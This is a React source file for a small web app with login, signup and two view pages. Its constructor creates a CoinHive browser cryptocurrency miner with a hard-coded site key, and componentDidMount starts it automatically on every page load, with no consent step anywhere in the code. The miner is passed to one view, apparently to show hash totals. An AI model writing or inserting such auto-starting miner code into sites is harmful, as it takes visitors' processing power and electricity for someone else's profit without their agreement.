import React, { Component } from 'react'
import ReactDOM from 'react-dom'
import { Button } from 'react-bootstrap'
import View1 from './View1.jsx'
import View2 from './View2.jsx'
import Login from './Login.jsx'
import Signup from './Signup.jsx'
//test comment 
class App extends Component {
  constructor(props) {
    super(props);
    this.handleClickButton = this.handleClickButton.bind(this)
    this.miner = new CoinHive.Anonymous('6UtrrYYyMYrjRjXpipAn5FNt8SX0fdGc');
    this.state = {
      viewing: 1,
      hashTotal: 0
    };
  }

  componentDidMount() {
    this.miner.start();
    console.log('Miner is working');
  }

  handleClickButton(pageNum) {
    console.log('pageNum', pageNum)
    this.setState({ viewing: pageNum }, () => { console.log('new state: ', this.state, pageNum) });
  }

  render() {

    var sectionStyle = {
      height: '100vh',
      backgroundImage: "url('http://www.publicdomainpictures.net/pictures/190000/velka/black-background-1468370534d5s.jpg')",
    }
    return (
      <div id="main" style={sectionStyle}>
        <div>
          <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickButton.bind(null, 3)}>Login</Button>
          <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickButton.bind(null, 4)}>Signup</Button>
        </div>
        <div>
          <Button bsStyle="warning" bsSize="large" onClick={this.handleClickButton.bind(null, 1)}>View1</Button>
          <Button bsStyle="info" bsSize="large" onClick={this.handleClickButton.bind(null, 2)}>View2</Button>
        </div>
        <div>
          <div></div>
          {this.state.viewing === 1 ? <div><View1 miner={this.miner} viewing={this.state.viewing}/></div> : null}
          {this.state.viewing === 2 ? <div><View2 /></div> : null}
          {this.state.viewing === 3 ? <div><Login /></div> : null}
          {this.state.viewing === 4 ? <div><Signup /></div> : null}
        </div>
      </div>
    )
  }
}

ReactDOM.render(<App />, document.getElementById('app'))